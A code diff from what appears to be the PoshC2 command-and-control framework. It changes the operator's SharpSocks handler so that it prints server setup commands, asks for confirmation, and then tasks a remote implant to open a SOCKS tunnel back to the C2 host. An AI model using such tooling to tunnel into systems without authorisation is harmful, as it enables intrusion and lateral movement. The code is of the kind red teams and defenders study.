@@ -5,8 +5,8 @@ from Utils import randomuri, validate_sleep_time
 from DB import new_task, update_sleep, get_history, select_item, update_label, unhide_implant, update_item, kill_implant, get_implantbyid, get_implantdetails, get_pid, get_c2server_all, get_newimplanturl, get_allurls, get_sharpurls, new_urldetails
 from AutoLoads import check_module_loaded, run_autoloads
 from Help import COMMANDS, posh_help, posh_help1, posh_help2, posh_help3, posh_help4, posh_help5, posh_help6, posh_help7, posh_help8
-from Config import ModulesDirectory, PayloadsDirectory, POSHDIR, ROOTDIR
-from Core import readfile_with_completion, filecomplete
+from Config import ModulesDirectory, PayloadsDirectory, POSHDIR, ROOTDIR, SocksHost
+from Core import readfile_with_completion, filecomplete, shellcodefilecomplete
 from Opsec import ps_opsec
 from Payloads import Payloads
 from Utils import argp, load_file, gen_key
@@ -437,9 +437,15 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
       sharpkey = gen_key()
       sharpurls = get_sharpurls()
       sharpurl = select_item("HostnameIP", "C2Server")
-      new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl,channel,sharpkey,sharpurls), user, randomuri)
-      print ("git clone https://github.com/nettitude/SharpSocks.git")
-      print ("SharpSocksServerTestApp.exe -c %s -k %s -l http://IPADDRESS:8080" % (channel,sharpkey))
+      print (Colours.RED+"\r\ngit clone https://github.com/nettitude/SharpSocks.git")
+      print ("wine SharpSocksServerTestApp.exe -c %s -k %s -l %s\r\n" % (channel,sharpkey,SocksHost)+Colours.GREEN)
+      ri = raw_input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
+      if ri.lower() == "n":
+        print("")        
+      if ri == "":
+        new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl,channel,sharpkey,sharpurls), user, randomuri)
+      if ri.lower() == "y":
+        new_task("Sharpsocks -Client -Uri %s -Channel %s -Key %s -URLs %s -Insecure -Beacon 2000" % (sharpurl,channel,sharpkey,sharpurls), user, randomuri)
 
     elif (command.lower() == "history") or command.lower() == "history ":
       startup(user, get_history())
